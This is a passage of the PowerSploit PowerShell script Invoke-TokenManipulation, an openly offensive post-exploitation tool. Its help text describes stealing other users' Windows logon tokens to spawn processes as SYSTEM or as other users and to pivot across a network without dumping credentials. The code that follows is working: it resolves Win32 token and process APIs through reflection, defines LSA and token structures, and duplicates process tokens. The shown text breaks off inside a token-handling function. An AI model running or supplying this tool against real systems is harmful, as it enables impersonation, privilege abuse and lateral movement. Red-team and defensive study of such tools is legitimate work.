function Invoke-TokenManipulation
{
<#
.SYNOPSIS

THIS IS CURRENTLY IN BETA AND SOME FEATURES DONT FULLY WORK!

This script requires Administrator privileges. It can enumerate the Logon Tokens available and use them to create new processes. This allows you to use
anothers users credentials over the network by creating a process with their logon token. This will work even with Windows 8.1 LSASS protections.
This functionality is very similar to the incognito tool (with some differences, and different use goals).

This script can also make the PowerShell thread impersonate another users Logon Token. Unfortunately this doesn't work well, because PowerShell
creates new threads to do things, and those threads will use the Primary token of the PowerShell process (your original token) and not the token
that one thread is impersonating. Because of this, you cannot use thread impersonation to impersonate a user and then use PowerShell remoting to connect
to another server as that user (it will authenticate using the primary token of the process, which is your original logon token).

Because of this limitation, the recommended way to use this script is to use CreateProcess to create a new PowerShell process with another users Logon 
Token, and then use this process to pivot. This works because the entire process is created using the other users Logon Token, so it will use their
credentials for the authentication.


Important differences from incognito:
First of all, you should probably read the incognito white paper to understand what incognito does. If you use incognito, you'll notice it differentiates
between "Impersonation" and "Delegation" tokens. This is because incognito can be used in situations where you get remote code execution against a service
which has threads impersonating multiple users. Incognito can enumerate all tokens available to the service process, and impersonate them (which might allow
you to elevate privileges). This script must be run as administrator, and because you are already an administrator, the primary use of this script is for pivoting
without dumping credentials. 

In this situation, Impersonation vs Delegation does not matter because an administrator can turn any token in to a primary token (delegation rights). What does
matter is the logon type used to create the logon token. If a user connects using Network Logon (aka type 3 logon), the computer will not have any credentials for 
the user. Since the computer has no credentials associated with the token, it will not be possible to authenticate off-box with the token. All other logon types
should have credentials associated with them (such as Interactive logon, Service logon, Remote interactive logon, etc). Therefore, this script looks
for tokens which were created with desirable logon tokens (and only displays them by default).

In a nutshell, instead of worrying about "delegation vs impersonation" tokens, you should worry about NetworkLogon (bad) vs Non-NetworkLogon (good).


PowerSploit Function: Invoke-TokenManipulation
Author: Joe Bialek, Twitter: @JosephBialek
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
Version: 0.11

.DESCRIPTION

Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread.

.PARAMETER Enum

Switch. Specifics to enumerate logon tokens available. By default this will only list unqiue usable tokens (not network-logon tokens).

.PARAMETER RevToSelf

Switch. Stops impersonating an alternate users Token.

.PARAMETER ShowAll

Switch. If Enum is specified with this flag, all Logon Tokens will be listed (including non-unique tokens and NetworkLogon tokens).

.PARAMETER ImpersonateUser

Switch. Will impersonate an alternate users logon token in the PowerShell thread. Can specify the token to use by Username, ProcessId, or ThreadId.
    This mode is not recommended because PowerShell is heavily threaded and many actions won't be done in the current thread. Use CreateProcess instead.
	
.PARAMETER CreateProcess

Switch. Will create a new process with an alternate users logon token. Can specify the token to use by Username, ProcessId, or ThreadId.
	
.PARAMETER WhoAmI

Switch. Displays the credentials the PowerShell thread is running under.

.PARAMETER Username

Specify the Token to use by username. This will choose a non-NetworkLogon token belonging to the user.

.PARAMETER ProcessId

Specify the Token to use by ProcessId. This will use the primary token of the process specified.

.PARAMETER ThreadId

Specify the Token to use by ThreadId. This will use the token of the thread specified.

.PARAMETER ProcessName

Specify the name of the process to spawn when using the -CreateProcess mode. You may need to specify the full path to the executable.

.PARAMETER ProcessArgs

Specify the arguments to start the specified process with when using the -CreateProcess mode.

	
.EXAMPLE

Invoke-TokenManipulation -Enum

Lists all unique usable tokens on the computer.

.EXAMPLE

Invoke-TokenManipulation -CreateProcess -Username "nt authority\system" -ProcessName "cmd.exe"

Spawns cmd.exe as SYSTEM.

.EXAMPLE

Invoke-TokenManipulation -ImpersonateUser -Username "nt authority\system"

Makes the current PowerShell thread impersonate SYSTEM.

.EXAMPLE

Invoke-TokenManipulation -CreateProcess -ProcessId 500 -ProcessName "cmd.exe"

Spawns cmd.exe using the primary token belonging to process ID 500.

.EXAMPLE

Invoke-TokenManipulation -Enum -ShowAll

Lists all tokens available on the computer, including non-unique tokens and tokens created using NetworkLogon.

.NOTES
This script was inspired by incognito. 

Several of the functions used in this script were written by Matt Graeber(Twitter: @mattifestation, Blog: http://www.exploit-monday.com/).

.LINK

Blog: http://clymb3r.wordpress.com/
Github repo: https://github.com/clymb3r/PowerShell

#>

    [CmdletBinding(DefaultParameterSetName="Enum")]
    Param(
        [Parameter(ParameterSetName = "Enum")]
        [Switch]
        $Enum,

        [Parameter(ParameterSetName = "RevToSelf")]
        [Switch]
        $RevToSelf,

        [Parameter(ParameterSetName = "ShowAll")]
        [Switch]
        $ShowAll,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Switch]
        $ImpersonateUser,

        [Parameter(ParameterSetName = "CreateProcess")]
        [Switch]
        $CreateProcess,

        [Parameter(ParameterSetName = "WhoAmI")]
        [Switch]
        $WhoAmI,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $Username,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        [Int]
        $ProcessId,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        $ThreadId,

        [Parameter(ParameterSetName = "CreateProcess", Mandatory=$true)]
        [String]
        $ProcessName,

        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $ProcessArgs
    )
   
    Set-StrictMode -Version 2

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}

    ###############################
    #Win32Constants
    ###############################
    $Win32Constants = New-Object PSObject
    $Win32Constants | Add-Member -Type NoteProperty -Name PROCESS_QUERY_INFORMATION -Value 0x400
    $Win32Constants | Add-Member -Type NoteProperty -Name TOKEN_ASSIGN_PRIMARY -Value 0x1
    $Win32Constants | Add-Member -Type NoteProperty -Name TOKEN_DUPLICATE -Value 0x2
    $Win32Constants | Add-Member -Type NoteProperty -Name TOKEN_IMPERSONATE -Value 0x4
    $Win32Constants | Add-Member -Type NoteProperty -Name TOKEN_QUERY -Value 0x8
    $Win32Constants | Add-Member -Type NoteProperty -Name TOKEN_QUERY_SOURCE -Value 0x10
    $Win32Constants | Add-Member -Type NoteProperty -Name STANDARD_RIGHTS_READ -Value 0x20000
    $Win32Constants | Add-Member -Type NoteProperty -Name STANDARD_RIGHTS_REQUIRED -Value 0xF0000
    $Win32Constants | Add-Member -Type NoteProperty -Name TokenStatistics -Value 10
    $Win32Constants | Add-Member -Type NoteProperty -Name TOKEN_ALL_ACCESS -Value 0xf01ff
    $Win32Constants | Add-Member -Type NoteProperty -Name MAXIMUM_ALLOWED -Value 0x02000000
    $Win32Constants | Add-Member -Type NoteProperty -Name THREAD_ALL_ACCESS -Value 0x1f03ff
    $Win32Constants | Add-Member -Type NoteProperty -Name ERROR_NO_TOKEN -Value 0x3F0
    $Win32Constants | Add-Member -Type NoteProperty -Name ERROR_INVALID_PARAMETER -Value 0x57
    $Win32Constants | Add-Member -Type NoteProperty -Name LOGON_NETCREDENTIALS_ONLY -Value 0x2
    ###############################


    ###############################
    #Win32Structures
    ###############################
	#Define all the structures/enums that will be used
	#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
	$Domain = [AppDomain]::CurrentDomain
	$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
	$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
	$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

    #ENUMs
	$TypeBuilder = $ModuleBuilder.DefineEnum('TOKEN_INFORMATION_CLASS', 'Public', [UInt32])
	$TypeBuilder.DefineLiteral('TokenUser', [UInt32] 1) | Out-Null
    $TypeBuilder.DefineLiteral('TokenGroups', [UInt32] 2) | Out-Null
    $TypeBuilder.DefineLiteral('TokenPrivileges', [UInt32] 3) | Out-Null
    $TypeBuilder.DefineLiteral('TokenOwner', [UInt32] 4) | Out-Null
    $TypeBuilder.DefineLiteral('TokenPrimaryGroup', [UInt32] 5) | Out-Null
    $TypeBuilder.DefineLiteral('TokenDefaultDacl', [UInt32] 6) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSource', [UInt32] 7) | Out-Null
    $TypeBuilder.DefineLiteral('TokenType', [UInt32] 8) | Out-Null
    $TypeBuilder.DefineLiteral('TokenImpersonationLevel', [UInt32] 9) | Out-Null
    $TypeBuilder.DefineLiteral('TokenStatistics', [UInt32] 10) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedSids', [UInt32] 11) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSessionId', [UInt32] 12) | Out-Null
    $TypeBuilder.DefineLiteral('TokenGroupsAndPrivileges', [UInt32] 13) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSessionReference', [UInt32] 14) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSandBoxInert', [UInt32] 15) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAuditPolicy', [UInt32] 16) | Out-Null
    $TypeBuilder.DefineLiteral('TokenOrigin', [UInt32] 17) | Out-Null
    $TypeBuilder.DefineLiteral('TokenElevationType', [UInt32] 18) | Out-Null
    $TypeBuilder.DefineLiteral('TokenLinkedToken', [UInt32] 19) | Out-Null
    $TypeBuilder.DefineLiteral('TokenElevation', [UInt32] 20) | Out-Null
    $TypeBuilder.DefineLiteral('TokenHasRestrictions', [UInt32] 21) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAccessInformation', [UInt32] 22) | Out-Null
    $TypeBuilder.DefineLiteral('TokenVirtualizationAllowed', [UInt32] 23) | Out-Null
    $TypeBuilder.DefineLiteral('TokenVirtualizationEnabled', [UInt32] 24) | Out-Null
    $TypeBuilder.DefineLiteral('TokenIntegrityLevel', [UInt32] 25) | Out-Null
    $TypeBuilder.DefineLiteral('TokenUIAccess', [UInt32] 26) | Out-Null
    $TypeBuilder.DefineLiteral('TokenMandatoryPolicy', [UInt32] 27) | Out-Null
    $TypeBuilder.DefineLiteral('TokenLogonSid', [UInt32] 28) | Out-Null
    $TypeBuilder.DefineLiteral('TokenIsAppContainer', [UInt32] 29) | Out-Null
    $TypeBuilder.DefineLiteral('TokenCapabilities', [UInt32] 30) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAppContainerSid', [UInt32] 31) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAppContainerNumber', [UInt32] 32) | Out-Null
    $TypeBuilder.DefineLiteral('TokenUserClaimAttributes', [UInt32] 33) | Out-Null
    $TypeBuilder.DefineLiteral('TokenDeviceClaimAttributes', [UInt32] 34) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedUserClaimAttributes', [UInt32] 35) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedDeviceClaimAttributes', [UInt32] 36) | Out-Null
    $TypeBuilder.DefineLiteral('TokenDeviceGroups', [UInt32] 37) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedDeviceGroups', [UInt32] 38) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSecurityAttributes', [UInt32] 39) | Out-Null
    $TypeBuilder.DefineLiteral('TokenIsRestricted', [UInt32] 40) | Out-Null
    $TypeBuilder.DefineLiteral('MaxTokenInfoClass', [UInt32] 41) | Out-Null
	$TOKEN_INFORMATION_CLASS = $TypeBuilder.CreateType()

    #STRUCTs
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LARGE_INTEGER', $Attributes, [System.ValueType], 8)
	$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
	$LARGE_INTEGER = $TypeBuilder.CreateType()

    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
	$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('HighPart', [Int32], 'Public') | Out-Null
	$LUID = $TypeBuilder.CreateType()

    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_STATISTICS', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('TokenId', $LUID, 'Public') | Out-Null
	$TypeBuilder.DefineField('AuthenticationId', $LUID, 'Public') | Out-Null
    $TypeBuilder.DefineField('ExpirationTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('TokenType', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('ImpersonationLevel', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('DynamicCharged', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('DynamicAvailable', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('GroupCount', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('ModifiedId', $LUID, 'Public') | Out-Null
	$TOKEN_STATISTICS = $TypeBuilder.CreateType()

    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LSA_UNICODE_STRING', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('Length', [UInt16], 'Public') | Out-Null
	$TypeBuilder.DefineField('MaximumLength', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('Buffer', [IntPtr], 'Public') | Out-Null
	$LSA_UNICODE_STRING = $TypeBuilder.CreateType()

    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LSA_LAST_INTER_LOGON_INFO', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('LastSuccessfulLogon', $LARGE_INTEGER, 'Public') | Out-Null
	$TypeBuilder.DefineField('LastFailedLogon', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('FailedAttemptCountSinceLastSuccessfulLogon', [UInt32], 'Public') | Out-Null
	$LSA_LAST_INTER_LOGON_INFO = $TypeBuilder.CreateType()

    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('SECURITY_LOGON_SESSION_DATA', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('Size', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('LoginID', $LUID, 'Public') | Out-Null
    $TypeBuilder.DefineField('Username', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('LoginDomain', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('AuthenticationPackage', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('LogonType', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Session', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('Sid', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('LoginTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('LoginServer', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('DnsDomainName', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('Upn', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('UserFlags', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('LastLogonInfo', $LSA_LAST_INTER_LOGON_INFO, 'Public') | Out-Null
    $TypeBuilder.DefineField('LogonScript', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('ProfilePath', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('HomeDirectory', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('HomeDirectoryDrive', $LSA_UNICODE_STRING, 'Public') | Out-Null
    $TypeBuilder.DefineField('LogoffTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('KickOffTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('PasswordLastSet', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('PasswordCanChange', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('PasswordMustChange', $LARGE_INTEGER, 'Public') | Out-Null
	$SECURITY_LOGON_SESSION_DATA = $TypeBuilder.CreateType()

    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('STARTUPINFO', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('cb', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('lpReserved', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpDesktop', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpTitle', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwX', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwY', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFillAttribute', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFlags', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('wShowWindow', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('cbReserved2', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpReserved2', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdInput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdOutput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdError', [IntPtr], 'Public') | Out-Null
	$STARTUPINFO = $TypeBuilder.CreateType()

    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('PROCESS_INFORMATION', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('hProcess', [IntPtr], 'Public') | Out-Null
	$TypeBuilder.DefineField('hThread', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwProcessId', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwThreadId', [UInt32], 'Public') | Out-Null
	$PROCESS_INFORMATION = $TypeBuilder.CreateType()

    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_ELEVATION', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('TokenIsElevated', [UInt32], 'Public') | Out-Null
	$TOKEN_ELEVATION = $TypeBuilder.CreateType()
    ###############################


    ###############################
    #Win32Functions
    ###############################
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	$OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)

    $OpenProcessTokenAddr = Get-ProcAddress advapi32.dll OpenProcessToken
	$OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)    

    $GetTokenInformationAddr = Get-ProcAddress advapi32.dll GetTokenInformation
	$GetTokenInformationDelegate = Get-DelegateType @([IntPtr], $TOKEN_INFORMATION_CLASS, [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
	$GetTokenInformation = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetTokenInformationAddr, $GetTokenInformationDelegate)    

    $SetThreadTokenAddr = Get-ProcAddress advapi32.dll SetThreadToken
	$SetThreadTokenDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([Bool])
	$SetThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetThreadTokenAddr, $SetThreadTokenDelegate)    

    $ImpersonateLoggedOnUserAddr = Get-ProcAddress advapi32.dll ImpersonateLoggedOnUser
	$ImpersonateLoggedOnUserDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$ImpersonateLoggedOnUser = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateLoggedOnUserAddr, $ImpersonateLoggedOnUserDelegate)

    $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
	$RevertToSelfDelegate = Get-DelegateType @() ([Bool])
	$RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)

    $LsaGetLogonSessionDataAddr = Get-ProcAddress secur32.dll LsaGetLogonSessionData
	$LsaGetLogonSessionDataDelegate = Get-DelegateType @([IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
	$LsaGetLogonSessionData = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaGetLogonSessionDataAddr, $LsaGetLogonSessionDataDelegate)

    $CreateProcessWithTokenWAddr = Get-ProcAddress advapi32.dll CreateProcessWithTokenW
	$CreateProcessWithTokenWDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$CreateProcessWithTokenW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessWithTokenWAddr, $CreateProcessWithTokenWDelegate)

    $memsetAddr = Get-ProcAddress msvcrt.dll memset
	$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
	$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)

    $DuplicateTokenExAddr = Get-ProcAddress advapi32.dll DuplicateTokenEx
	$DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)

    $LookupAccountSidWAddr = Get-ProcAddress advapi32.dll LookupAccountSidW
	$LookupAccountSidWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
	$LookupAccountSidW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupAccountSidWAddr, $LookupAccountSidWDelegate)

    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
	$CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

    $LsaFreeReturnBufferAddr = Get-ProcAddress secur32.dll LsaFreeReturnBuffer
	$LsaFreeReturnBufferDelegate = Get-DelegateType @([IntPtr]) ([UInt32])
	$LsaFreeReturnBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaFreeReturnBufferAddr, $LsaFreeReturnBufferDelegate)

    $OpenThreadAddr = Get-ProcAddress kernel32.dll OpenThread
	$OpenThreadDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadAddr, $OpenThreadDelegate)

    $OpenThreadTokenAddr = Get-ProcAddress advapi32.dll OpenThreadToken
	$OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
	$OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)

    $CreateProcessAsUserWAddr = Get-ProcAddress advapi32.dll CreateProcessAsUserW
	$CreateProcessAsUserWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$CreateProcessAsUserW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessAsUserWAddr, $CreateProcessAsUserWDelegate)
    ###############################


    function Get-PrimaryToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ProcessId,

            #Open the token with all privileges. Requires SYSTEM because some of the privileges are restricted to SYSTEM.
            [Parameter()]
            [Switch]
            $FullPrivs
        )

        if ($FullPrivs)
        {
            $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS
        }
        else
        {
            $TokenPrivs = $Win32Constants.TOKEN_ASSIGN_PRIMARY -bor $Win32Constants.TOKEN_DUPLICATE -bor $Win32Constants.TOKEN_IMPERSONATE -bor $Win32Constants.TOKEN_QUERY 
        }

        $ReturnStruct = New-Object PSObject

        $hProcess = $OpenProcess.Invoke($Win32Constants.PROCESS_QUERY_INFORMATION, $true, [UInt32]$ProcessId)
        $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcess -Value $hProcess
        if ($hProcess -eq [IntPtr]::Zero)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "Failed to open process handle for ProcessId: $ProcessId. Error code: $ErrorCode"
        }
        else
        {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $Success = $OpenProcessToken.Invoke($hProcess, $TokenPrivs, [Ref]$hProcToken)

            #Close the handle to hProcess (the process handle)
            if (-not $CloseHandle.Invoke($hProcess))
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to close process handle, this is unexpected. ErrorCode: $ErrorCode"
            }
            $hProcess = [IntPtr]::Zero

            if ($Success -eq $false -or $hProcToken -eq [IntPtr]::Zero)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to get processes primary token. ProcessId: $ProcessId. Error: $ErrorCode"
                $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcToken -Value [IntPtr]::Zero
            }
            else
            {
                $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcToken -Value $hProcToken
            }
        }

        return $ReturnStruct
    }


    function Get-ThreadToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ThreadId
        )

